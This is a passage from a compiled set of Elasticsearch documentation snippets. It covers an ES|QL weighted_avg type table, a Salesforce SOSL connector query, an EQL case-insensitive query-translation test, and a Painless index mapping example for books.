ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Type Support Matrix Table\nDESCRIPTION: A matrix table showing the result types when combining different numeric types (double, integer, long) in ESQL functions. The table defines that operations between any combination of these numeric types will result in a double type output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/weighted_avg.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| number | weight | result |\n| --- | --- | --- |\n| double | double | double |\n| double | integer | double |\n| double | long | double |\n| integer | double | double |\n| integer | integer | double |\n| integer | long | double |\n| long | double | double |\n| long | integer | double |\n| long | long | double |\n```\n\n----------------------------------------\n\nTITLE: Fetching Documents using SOSL Query\nDESCRIPTION: This code snippet illustrates the process of fetching documents using a SOSL query. Users can input a valid SOSL query string, and the output will be an array of documents that match the search criteria.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-salesforce.md#2025-04-21_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\n[\n  {\n    \"query\": \"FIND {Salesforce} IN ALL FIELDS\",\n    \"language\": \"SOSL\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: EQL Case Insensitive Equals\nDESCRIPTION: Executes a case-insensitive equality check for the process name being 'test'. Verifies handling of case insensitivity in transformation to a term query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_3\n\nLANGUAGE: basic\nCODE:\n```\nprocess where process_name : \"test\"\n;\n\"term\":{\"process_name\":{\"value\":\"test\",\"case_insensitive\":true}\n;\n```\n\n----------------------------------------\n\nTITLE: Defining Index Mapping for Books with Page Count\nDESCRIPTION: This snippet shows how to create an index mapping for books, including fields for name, author, release date, and page count as a long type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"name\": {\n        \"type\": \"keyword\"\n      },\n      \"author\": {\n        \"type\": \"keyword\"\n      },\n      \"release_date\": {\n        \"type\": \"date\"\n      },\n      \"page_count\": {\n        \"type\": \"long\"\n      }\n    }\n  }\n}\n```"
  }
]